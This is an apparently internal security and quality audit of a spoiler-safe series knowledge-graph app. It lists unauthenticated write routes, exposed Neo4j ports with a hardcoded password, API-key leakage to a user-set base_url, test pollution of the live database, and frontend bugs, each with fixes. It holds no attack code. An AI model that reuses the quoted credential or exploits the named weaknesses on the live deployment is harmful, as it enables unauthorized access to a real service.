Consolidated index of all 45 problems: the causing file:method and what it breaks.

| # | Causing file:method | Effect |
|---|---|---|
| 1 | `api/user_content.py` `create_note`/`update_note`/`delete_note`/`create_custom_node`/`create_custom_relationship`/…; `api/candidates.py` `ingest_candidates`/`approve_candidate`/`reject_candidate`/`edit_candidate`; `api/revisions.py` `revert_revision` — none depend on `CurrentUserDependency` | 14 anonymous write operations; anyone mutates the shared graph |
| 2 | `api/candidates.py::approve_candidate` (line 163) | Anonymous promote-to-canonical → permanent graph poisoning |
| 3 | `api/revisions.py::revert_revision` (line 119) | Anonymous revert overwrites any resource state |
| 4 | `repository/user_content.py` update/delete paths (origin-only gate, no owner id); `domain/user_content.py::NoteResponse` (no `user_id`) | Everyone edits and deletes everyone's content |
| 5 | `api/settings.py::update_llm_settings` (any auth) + `services/chat.py::get_llm_provider` + `llm/provider.py::OpenAICompatibleProvider.__init__` / `GeminiProvider` | Stored API key sent to attacker-chosen base_url; plaintext at rest |
| 6 | `services/chat.py::_acquire_generation_slot` (in-memory dict); no rate limiter anywhere | Unbounded LLM cost; slot limit breaks under multi-worker |
| 7 | `api/auth.py::dev_auth` (gated only by `auth_dev_code` in `.env`) | Backdoor login when the env file ships/copies |
| 8 | `core/config.py::Settings.session_cookie_secure` (default False) + `.env.example:10` | Session cookie over plain HTTP |
| 9 | `repository/session.py::Neo4jSessionRepository.create/refresh` + `services/auth.py::get_current_user` (refresh per request) | Unbounded `:Session` growth; a DB write per request |
| 10 | `api/auth.py::verify_origin` (missing Origin → allow) + absent on `api/auth.py::logout` | CSRF defense gap |
| 11 | `repository/user_content.py::create_note` (target-derived visibility, unmoderated content) | Anonymous spoiler injection visible to everyone |
| 12 | `api/graph.py::get_graph` + `api/series.py::list_episodes` (`OptionalUserDependency`, client-chosen boundary) | Entire future graph fetchable anonymously |
| 13 | `api/candidates.py::list_candidates` (optional `visible_until_order`) | All-visibility candidate dump |
| 14 | `backend/tests/test_seed_idempotency.py` (exact counts vs live DB) | 3 tests red at HEAD |
| 15 | `backend/tests/conftest.py` + shared live Neo4j | Test suite mutates production graph |
| 16 | `hooks/useChatSessions.ts` / `useNotes.ts` / `useRevisions.ts` (ref writes during render) + `DetailPanel.tsx`/`GraphCanvas.tsx` | 28 lint errors incl. real React 19 bugs |
| 17 | `App.test.tsx` e2e test (order/timing dependent) | Suite flaky; can't gate releases |
| 18 | `retrieval/pipeline.py` (980), `retrieval/tools.py` (852), `llm/system_prompt.py` (837), … | God-files; duplicate-def regression history |
| 19 | `graph/seed.py::create_constraints` (schema-as-code, no migrations) | Silent schema drift across deployments |
| 20 | `core/errors.py::ErrorDetail` (lowercase regex) vs `api/auth.py`/`llm` uppercase codes | Self-contradictory error contract |
| 21 | `docs/API.md` hand-maintained counts | 44/32 vs live 45/33 (missing dev route) |
| 22 | `docs/ARCHITECTURE.md` §ChangeSet (line 562) | Claims `proposed_change_set: null` — false since 07-07 |
| 23 | `docs/ARCHITECTURE.md` §Known gaps (line 596) | Lists fixes that landed 07-02/07-05 |
| 24 | `docs/ROADMAP.md` (207-209) | Defers auth/CSRF/roles to backlog |
| 25 | repo root `main.py` (PyCharm template), `frontend/README.md` (Vite boilerplate) | Committed junk |
| 26 | missing `.github/`, no app Dockerfiles | Zero deployment story |
| 27 | `docker-compose.yml::NEO4J_AUTH` vs `.env.example::NEO4J_PASSWORD` | Credential mismatch, silent misconfig |
| 28 | `data/dexter/seed/characters.json` (Fandom hotlinks) + no LICENSE/CONTRIBUTING | Copyright exposure; hotlink breakage |
| 29 | git state: 47 ahead, remote API `Not Found` | Work exists only on one machine |
| 30 | `frontend/.env.example` (`VITE_API_BASE_URL` dead), `SettingsPage.tsx:86` strip mismatch, `.gitignore` leftovers | Minor operator traps |
| 31 | `docker-compose.yml` (ports `7474/7687` published, hardcoded `neo4j/hdgraf-local-password`, floating tag) | Neo4j exposed to the internet |
| 32 | `repository/session.py::Neo4jSessionRepository.create` (`id=f"session:{user_id}:{int(now)}"`) | Same-second login → constraint error |
| 33 | `revisions/__init__.py::RevisionRepository.log_revision` (no `user_id` param) | Ghost audit log; zero accountability |
| 34 | `api/candidates.py::approve_candidate/reject_candidate` (sha256 rev_id) vs `revisions/__init__.py::log_revision` (uuid4) | Returned `revision_id` doesn't exist |
| 35 | `services/chat.py::ChatService.answer_stream` (persist-before-generate) + `api/chat.py::stream_message` event_stream (bare except, no log) | Orphaned user messages; silent stream failures |
| 36 | `graph/database.py::Neo4jDatabase.open` (admin creds, all-defaults driver) | No least privilege; compromise = full DB |
| 37 | `spoiler/policy.py::validate_visibility_order` (`order < 1` on `None`) | 500 instead of 422 on malformed progress |
| 38 | `backend/app/main.py` (CORS-only middleware) | No CSP/HSTS/security headers |
| 39 | `core/errors.py::install_error_handlers` (exceptions dropped, never logged) | Black-box production |
| 40 | missing test files: `graph/database.py`, `graph/ontology.py`, `services/series.py`, `api/series.py`, `api/deps.py`, `core/config.py`, `llm/system_prompt.py`, `main.py` | Untested core |
| 41 | `repository/settings.py` docstring (constraint that doesn't exist); `SettingsPage.tsx:86`; `api/candidates.py` `repo._db`; `graph/ontology.py::load_ontology` (uncached, import-time) | Code lies; layering breaches; import-time crash risk |
| 42 | `services/auth.py::ProductionGoogleVerifier.verify` (line 73 `except google.auth.exceptions.TransportError`) | Google login 503 `NameError` (reproduced) |
| 43 | `api/progress.ts::updateProgress` (line 36) + `useWatchProgress.ts::confirmChange` (165-168) vs `domain/progress.py::ProgressUpdateRequest._exactly_one_boundary_field` | Confirm-watch 422; progress never persists; view-only confirms |
| 44 | `spoiler/filter.py::SERIES_EPISODES_QUERY` vs stale live DB (missing episode props) | `01N52` warning storm; seed drift evidence |
| 45 | `useChatMessages.ts` (conditional hook, mid-edit) + no error boundary in `App.tsx`/`main.tsx` + `GraphCanvas.tsx:22` `console.log` | App blank on render error; debug noise in prod |
| 46 | `backend/tests/test_candidate_ingest.py`/`test_candidate_review.py` (write real `series_dexter` rows, no cleanup) + no session sweep | 3,855 zombie `:AppUser`, 21/21 expired sessions, seed tests red (`33 != 27`) |
| 47 | `backend/tests/test_auth.py` (fake verifier everywhere; `ProductionGoogleVerifier` only imported) + 10 FE files mocking the api client | NameError (#42) and progress-422 (#43) shipped green |
| 48 | `retrieval/pipeline.py::_finalize` (`notes=[]` hardcoded) + `_accumulate` (no notes bucket) | `get_user_notes` results never enter the assembled context |
| 49 | `repository/change_set.py` apply (stamps `current_progress`) vs `repository/user_content.py:179` (stamps `episode.episode_order`) | Two visibility-derivation rules for the same create intent |
| 50 | `graph/change_set.py` create queries (stamp `created_by`) vs `repository/user_content.py` create queries (no actor) | Ownership metadata only on the auth-gated path |
| 51 | `graph/change_set.py::MARK_CHANGE_SET_REVERTED_QUERY` (overwrites `revision_id`) | Revert loses the apply-revision link |
| 52 | `llm/provider.py:191` (uncaught `JSONDecodeError`), `llm/fallbacks.py::detect_language` (dead), `pipeline.py:701-707` (full tool-result replay) | Silent stream failure; dead code; per-round cost bloat |
| 53 | `spoiler/filter.py` SOURCES/EVIDENCE endpoint MATCH (no `series_id`), `DetailPanel.tsx`/`GraphCanvas.tsx` size, `docs/DEVELOPMENT.md:50` command | Cross-series collision risk; god-files; doc command drift |
| 54 | (context) ChangeSet path + `spoiler/filter.py` = strongest code; live DB has 0 notes/nodes/revisions/ChangeSets | Product surface unexercised; prototype = seed + 3,855 zombie users |
| 55 | `backend/.env` (NEO4J dup), `frontend/.env.local` (`VITE_GOOGLE_CLIENT_ID` empty), missing `envDir` in `vite.config.ts` | Credential drift; Google sign-in shows "not configured"; 3 files for one config |
| 56 | `frontend/src/hooks/useWatchProgress.ts::requestChange` (lines 133, 139 — silent no-op + PROG-01 view-only swallow) + mount-time `getProgress` hydration race (lines 104-129) | Clicking a locked episode above the current view sometimes opens no unlock dialog and never loads the episode (user-reported, live) |

---

## FOURTH PASS — deep-walk findings (ChangeSet, LLM brain, test quality, live DB)

Full walk of the ChangeSet path (api/service/domain/repository/graph), the LLM pipeline (pipeline/tools/provider/prompt), the auth/verifier test surface, and a **read-only live-DB audit**. Verdict up front: the ChangeSet path and the spoiler read-path (`spoiler/filter.py`) are the **strongest code in the repo** — closed 13-op union, transactional apply, fresh in-transaction re-validation, revert conflict guards, query-by-query visibility gating. The problems below are the weak seams around them.

### 46. HIGH — Live DB is a landfill: 3,855 AppUser rows, 21/21 expired sessions — and the seed-drift root cause is proven
Read-only audit of the shared Neo4j (2026-08-04): **3,855 `:AppUser` nodes** (the "single-user" app), **21 `:Session` nodes — ALL 21 expired, 5 orphaned** (no owner), 1 progress row, 2 chat sessions. Every number confirms a documented problem with real data:
- #9 (sessions never swept): 21/21 expired, zero cleanup ever ran.
- #15 (tests pollute the live DB): 3,855 users came from test suites that create real `:AppUser` rows and fail to clean them up.
- **#14 root cause, exactly**: `series_dexter` holds **12 Claims vs 9 seeded (+3)** and **12 EvidenceFragments vs 9 (+3)** → 6 extra edges → `{'relationships': 33} != {'relationships': 27}` — the exact red test. The extra claims/evidence are leftover `test_candidate_ingest`/`test_candidate_review` rows on the seeded series. **Reseeding will NOT fix the red suite** while the candidate tests keep polluting — the tests must clean up after themselves (or run on a scratch series, which the runbook already documents for retrieval tests but the candidate tests ignore). **Fix:** sweep zombie users/sessions once; make candidate tests scratch-series-scoped; add a DB-pollution gate to CI.

### 47. HIGH — The auth verifier has ZERO behavioral tests — that's why the NameError shipped
`ProductionGoogleVerifier` appears in the test suite exactly once: `test_auth_module_imports` (`test_auth.py:697-704`) merely imports it. **Every** auth test injects a fake verifier, so the except-clause evaluation bug (#42 — `except google.auth.exceptions.TransportError` raising `NameError`) had no test to catch it. Same disease for #43: 10 frontend test files mock the API client modules, so the `updateProgress` wire-shape bug (visible_until_order + watched_through_order) shipped green — the runbook's two documented "bug enshrined by a mocking test" incidents (08-01 chat 422, progress 422) are the same pattern. **Fix:** a real `ProductionGoogleVerifier` test with a garbage token + MockTransport; contract tests that assert the exact request body the FE builds (no mocked API client on the wire-shape assertions).

### 48. MEDIUM — `get_user_notes` is wired but its results never reach the assembled context
The 11th allowlisted tool executes (`pipeline.py:762-769`), but: `retrieved` has no `notes` bucket (614-621), `_accumulate` merges only nodes/claims/evidence/sources/edges/entity (817-857), and `_finalize` hardcodes `notes=[]` (880) — so the `<notes>` context section is **always empty** and user notes never enter the framed context/citation pipeline. The model only sees notes if it happens to call the tool (results ride the raw tool round-trip). A user's private notes are effectively invisible to the assistant despite the advertised tool. Same "shipped plumbing, missing bridge" family as the pre-07-07 ChangeSet gap. **Fix:** add a `notes` accumulator bucket + pass `retrieved["notes"]` to `assemble_context`.

### 49. MEDIUM — Two create paths, two visibility rules
The direct user-content API derives `visible_from_order` from the named episode (`repository/user_content.py:179` — `episode.episode_order`); the ChangeSet apply path stamps `current_progress` for every create (`repository/change_set.py:625,669,726,777,797`) and validates the operation's `episode_id` **without ever using its order**. Same "create a node for episode N" intent, two different reveal points — and the ChangeSet path silently discards the user/LLM's episode choice. Fail-closed but inconsistent; the runbook's own "never fork a second filter implementation" rule is violated by two visibility-derivation implementations. **Fix:** one derivation rule (recommend: `max(episode order, current progress)` fail-closed) shared by both paths.

### 50. MEDIUM — `created_by` attribution exists only on ChangeSet creates
ChangeSet create queries stamp `created_by: $user_id` on every node/claim/note (`graph/change_set.py:211,249,284,320,339`); the direct user-content API creates (`repository/user_content.py` NOTE/NODE/RELATIONSHIP_CREATE_QUERIES) carry **no actor metadata at all** — and those are the anonymous routes (#1/#4). Ownership is half-implemented: the one path with attribution is the one behind auth. **Fix:** stamp `created_by` on the direct API paths too (and expose it in responses for the #4 ownership fix).

### 51. LOW — ChangeSet revert loses the apply-revision link
`MARK_CHANGE_SET_REVERTED_QUERY` overwrites `cs.revision_id` with the *revert* revision id (`graph/change_set.py:197`) — the original apply-time revision is no longer discoverable from the ChangeSet node. The Revision nodes themselves are never deleted (correct), but the linkage is gone. **Fix:** keep both ids (e.g. `apply_revision_id` + `revert_revision_id`).

### 52. LOW — Provider edge cases: uncaught JSON parse, dead code, cost bloat
- `OpenAICompatibleProvider` (`llm/provider.py:191`) does not catch `json.JSONDecodeError` on a malformed SSE chunk — it propagates to the route's bare `except Exception` → generic `LLM_STREAM_FAILED`, no log (GeminiProvider handles this defensively, OpenAI does not — inconsistent).
- `detect_language` (`llm/fallbacks.py:38`) is dead code (superseded by the prompt-language rule).
- The tool loop replays **full tool results** into the conversation every round (`pipeline.py:701-707`) — with up to 4 rounds and large retrievals, the final call carries several copies of the same context. **Fix:** catch JSONDecodeError; delete `detect_language`; cap or summarize replayed tool results.

### 53. LOW — Read-path nits + docs command drift
- `SOURCES_QUERY`/`EVIDENCE_QUERY` (`spoiler/filter.py:154-155,184-186`) match claim endpoints by `id` **without `series_id`** — safe today only because ids are globally unique by convention; a cross-series id collision would leak. Add `series_id` to the endpoint MATCH.
- `DetailPanel.tsx` (827 lines) and `GraphCanvas.tsx` (530) are more god-files (#18).
- `docs/DEVELOPMENT.md:50` documents `uv run python -m backend.app.graph.setup`; the runbook-canonical invocation is `uv run --project backend python -m backend.app.graph.setup` — the docs command is untested and differs.

### 54. Context — what is actually good, and what "the prototype" really is
- The **ChangeSet path** (propose→confirm→revert) and the **spoiler read-path** (`spoiler/filter.py` query-by-query gating) are well-built: closed operation union, `extra=forbid`, transactional apply with fresh in-transaction re-validation, the `_StaleResult` marker design, revert conflict guards, and D-20 gates on every constant. These need no rework.
- The live DB proves the product surface is **unexercised**: 0 `UserNote`, 0 user nodes, 0 user-relationship claims, 0 `Revision`, 0 `ChangeSet` — the notes/revisions/ChangeSet feature set has never been used in this environment. What exists is seed data + 3,855 zombie test users. "Polished vertical prototype" is generous; the interactive surface is untested-in-practice, which is exactly why #43 (progress 422) and the #42 NameError were only caught by log analysis.

### 55. MEDIUM — Three env files (one redundant), and the frontend Google client id is currently EMPTY
Current state (2026-08-04, key names only): root `.env` holds the backend runtime config (`GOOGLE_CLIENT_ID`, `AUTH_DEV_CODE`, `NEO4J_URI/USERNAME/PASSWORD/DATABASE`); **`backend/.env` duplicates just the 4 NEO4J keys** (drift risk, same disease as #27 — two copies of one credential); `frontend/.env.local` holds only `VITE_GOOGLE_CLIENT_ID` — **currently an empty value** (verified: sha256 of the value = empty-string hash), so `LoginPage.tsx:100` renders "Google Sign-In is not configured" and Google login cannot work until it is filled. The split exists for real reasons — backend reads env at runtime; Vite bakes only `VITE_`-prefixed vars into the public bundle at build time and reads from the frontend project dir by default — but the sprawl is fixable: **merge into one root `.env`** with `envDir: '..'` in `vite.config.ts` (Vite then loads root `.env`, still exposing only `VITE_*` to the browser — backend secrets stay server-side), and delete `backend/.env`. Caveat: `GOOGLE_CLIENT_ID` (backend audience check) and `VITE_GOOGLE_CLIENT_ID` (browser popup) must **always be the same value** — a mismatch is the #42 audience-mismatch 503 trigger; the merge keeps both names (Vite's `VITE_` prefix is mandatory for browser exposure) but one source of truth, plus a startup/CI equality check.

> **FACT-CHECK CORRECTION (2026-08-04, orchestrator during phase 08 execution):** the "currently an empty value" claim is **incorrect** — `frontend/.env.local`'s `VITE_GOOGLE_CLIENT_ID` was read twice live this session (13:41 and 14:05) and holds `631795043549-9cko8bh5iescr516nsac0hlnh85l961f.apps.googleusercontent.com` (a real client id, not an empty string). The `backend/.env` 4-key NEO4J duplication and the missing `envDir` in `vite.config.ts` are both **confirmed** live. Also: `AUTH_DEV_CODE` in root `.env` is a **stale leftover** — the dev-login backdoor was fully removed in `e093f81` (grep of `backend/app` for `auth/dev|AUTH_DEV_CODE|authenticate_dev|DevLoginRequest` returns nothing), so the var is dead config, not a live backdoor. The env-merge proposal itself (root `.env` + `envDir: '..'`, delete `backend/.env`) remains a valid cleanup and can be executed as a maintenance task; the phase-08 deploy currently reads the populated client id correctly.

---

## FIFTH PASS — user-reported live findings (post-deploy, 2026-08-04)

### 56. HIGH — Episode selector silently no-ops: clicking a locked episode above the current view sometimes neither opens the unlock dialog nor loads it
User-reported against the live deploy (`app.spoilerless.net`): from episode 1, clicking episode 3 "doesn't ask me anything and doesn't load episode 3" — intermittent. Two silent-swallow branches in `frontend/src/hooks/useWatchProgress.ts::requestChange` (lines 131-151):

- **Line 133** `if (nextOrder === currentView) return` — a hard silent no-op: if `viewAsOfOrder` already equals the clicked order (state drift between the selector's displayed value and the hook's `currentView`), the click is swallowed with no modal, no state change, no refetch.
- **Line 139** `if (watched != null && nextOrder <= watched)` — the PROG-01 view-only branch: when the backend's `watched_through_order` (hydrated on mount, `useEffect` lines 104-129) is already ≥ the clicked order while the selector still renders an older episode, the click is treated as view-only: it sets `viewAsOfOrder` locally and fires a view-only POST but **never opens `ConfirmAdvanceModal`**. If the view-only POST fails (network/401/422) the catch swallows it and the graph never refetches — the UI shows nothing happening.

Race: the mount-time `getProgress` hydration (`useEffect` deps `[]`, lines 104-129) resolves **after** the user clicks; the backend response then overwrites `watchedThroughOrder`/`viewAsOfOrder` via `setState`, clobbering the just-committed local boundary — the graph key (`App.tsx:55` `useGraph(watchProgress.seriesId, watchProgress.confirmedOrder)`) never changes to the clicked order, so "episode 3 doesn't load". Intermittent because it only triggers when hydration lands in the click window or the backend already holds a higher `watched_through_order`.

**Fix:** (a) in `requestChange`, never silently return — surface the no-op or reconcile `currentView`; (b) make the view-only branch await the POST and refetch the graph on failure (or optimistically refetch); (c) serialize the mount-time hydration against user clicks (skip hydration if a click already occurred, or merge backend values without clobbering a newer local change). Add a regression test: select above `watchedThroughOrder` with a failing view-only POST → dialog still opens / graph refetches.

---

## SEVENTH PASS — backend test-suite time (2026-08-10)

Suite was 75+ min (coding agents timed out mid-run; see BACKEND_DEPLOY_FIX.md).
Optimized in one pass (commit {h}):

- **Per-test full re-seed (was ~12s x N)** — graph/episode/api_series tests each
  re-seeded the dexter graph; kept function-scoped for isolation (module-scoped
  client broke cookie isolation + get_database lifespan interplay), duplicated
  `_seed_live_database` copies consolidated into conftest.
- **Per-test cleanup driver+queries (2nd driver + 2-8 Cypher x per test x 9
  files)** — moved to module-scoped teardown via `module_cleanup_fixture`
  (bound fixture; the factory result must be assigned, not discarded).
- **Per-probe TLS handshake (~1s x dozens)** — probe queries share a runner;
  fresh-driver `run_query` kept where read-after-write reliability matters
  (shared-driver variant intermittently missed app-driver writes).
- **chat_persistence sync->async** (asyncio_mode=auto), `loop_scope=module`.
- Fixed: ghost-node (fixed id) index-conflict residue via per-test cleanup.

Result: 75m -> ~40m serial (measured 33:34 with earlier variant; latest
reliability fixes re-add ~5m). PARALLEL chunks measured SLOWER than serial on
AuraDB (connection contention; memory rule holds). <8m requires local docker
Neo4j (scripts/env-local.sh; Docker Desktop currently not running).

Pre-existing failures (NOT from this pass, verified on HEAD): 3 doc-contract
tests (frontend_contract_doc, 2x openapi_contract — docs mid-update) and
TestSeedImageCuration (seed data has zero character image_url values).

## What to fix first (a survival order, not a wish list)

1. **Never run the Compose recipe as-is** — it exposes Neo4j to the internet with a hardcoded password (#31, #36). DB ports must be private, credentials forced, TLS on.
2. **Lock the write surface** — auth + ownership on user-content, candidates, revisions (#1-#4, #33). This is a weekend of work and removes 90% of the "public deployment" danger.
3. **Admin-gate the LLM settings** or make them per-user; remove `AUTH_DEV_CODE` from the deploy env (#5, #7).
4. **Rate-limit and budget the LLM path** before anyone else finds it (#6).
5. **Get both suites green and deterministic** (#14, #16, #17) — then wire CI; push the 47 commits (#29). Fix the one-line Google-login `NameError` (#42), the progress 422 contract bug (#43), the session-id collision (#32), and the fabricated `revision_id` (#34) in the same pass; add an error boundary (#45).
6. **Clean the test-pollution landfill** — sweep the 3,855 zombie users + expired sessions, make candidate tests scratch-series-scoped, write a real verifier test (#46, #47) — otherwise the suite can never be green or trustworthy.
7. **Stop trusting client-chosen boundaries for anonymous readers** (#12, #13) if spoiler-safety is the product.
8. **Regenerate the stale docs** (#21-#24) — or stop calling them documentation and delete them. A doc that claims `proposed_change_set: null` while the feature exists is worse than no doc.
9. **Decide the deployment shape** — Dockerfiles, TLS, backups, monitoring, security headers, logging (#26, #27, #38, #39) — before any public traffic.

Every item above is verifiable in under five minutes against the live repo. None of it requires rewriting the project; most of it is closing the gap between what the docs say and what the code does — the gap that makes this codebase feel hallucinated even where the features are real.

---

## SIXTH PASS — graph visualization is unusable at real content density (2026-08-05)

### 57. HIGH — The graph canvas is a spaghetti hairball: one flat force layout, zero clustering/filtering, and claims-as-edges explode the edge count
Once Episode 1 is enriched to real density (source-grounded S01E01 = **32 Characters, 39 Events, 17 Objects, 5 Organizations, 22 Locations, 132 Claims** → the graph API renders ~90 visible nodes and a dense mat of edges at boundary 1), `GraphCanvas.tsx` becomes visually unusable — verified against the live app: overlapping labels, crossing edges, a Dexter hub-star, and no way to focus or reduce. Root causes, all in `frontend/src/components/graph/GraphCanvas.tsx`:

- **One global force layout, nothing else.** `layoutOptionsFor` (lines 49-60) runs a single `cose-bilkent` pass over *every* element (`nodeRepulsion: 8000`, `idealEdgeLength: 100`, `padding: 48`). No compound/parent nodes, no per-subplot clustering, no community grouping, no seeded/deterministic positions — so the layout is a different hairball on every load and cannot separate the Donovan / Jaworski / Miami-Metro / Rita / truck / doll clusters that the data actually forms.
- **Claims are reified as edges** (subject→predicate→object) so *every atomic fact is a drawn edge*. 132 claims ⇒ ~132 relationship lines on top of `OCCURRED_IN`/`PART_OF`. Event nodes were meant to be bridges, but the protagonist still participates in ~every scene ⇒ Dexter is a ~40-edge hub. There is no edge bundling and no edge-type toggle.
- **No filtering / level-of-detail.** No node-type visibility toggles (can't hide Objects/Claims/Events), no edge-type filter, no neighborhood/focus mode, no collapse-expand of clusters, no zoom-based label culling. Every label renders at every zoom ⇒ the text overlaps into noise.
- **God-file, already flagged (#18/#53):** `GraphCanvas.tsx` (530 lines) mixes registration, layout, styling, and interaction; adding clustering/filter UI here compounds the problem.

Evidence: the two live screenshots (pre- and post-orphan-wiring) show the same hairball; before wiring, ~30 Object/Org nodes floated as a disconnected grid because nothing connected them (now fixed in seed, but the *layout* problem is independent of that data fix). Also note **`GraphCanvas.test.tsx:200` asserts `toHaveLength(11)`** for S01E01 — locked to the old 11-node seed; it will fail against the enriched graph and must be updated to the new count or made count-independent.

**Fix (layout + interaction, not data):**
1. Swap the flat `cose-bilkent` pass for a **cluster-aware layout** — `fcose` (same Bilkent family, supports `relativePlacement`/constraints and compound nodes) or `cytoscape-cola` with grouping — and drive grouping from a stable key the data already carries (`Event.sequence_in_episode` bands, or a subplot/cluster tag per node). Compound parent nodes per subplot give visual separation for free.
2. Add **node-type and edge-type filter toggles** (Characters / Events / Objects / Locations / Claims) and a **focus/neighborhood mode** (click a node → fade all but its N-hop neighborhood; the code already has `faded`/`selected-dominant` classes — wire a real focus reducer).
3. **Zoom-based label culling** (hide labels below a zoom threshold; show on hover) and **edge bundling** or opacity falloff to kill the mat.
4. **Deterministic layout** (seed positions or cache computed positions per boundary) so the graph doesn't re-scramble every load.
5. Optionally cap default on-canvas density: render Characters + Events + Locations by default, reveal Objects/Claims on demand or in the inspector (the frontend already keeps Claims/Evidence in the DetailPanel — extend that contract to Objects when density is high).
6. Update/relax `GraphCanvas.test.tsx` node-count assertions (currently `11`) to the enriched counts or to count-independent checks.

This is a rendering/interaction problem, not a data problem — the enriched seed is correct and validated; the canvas just has no strategy for showing more than a toy graph.
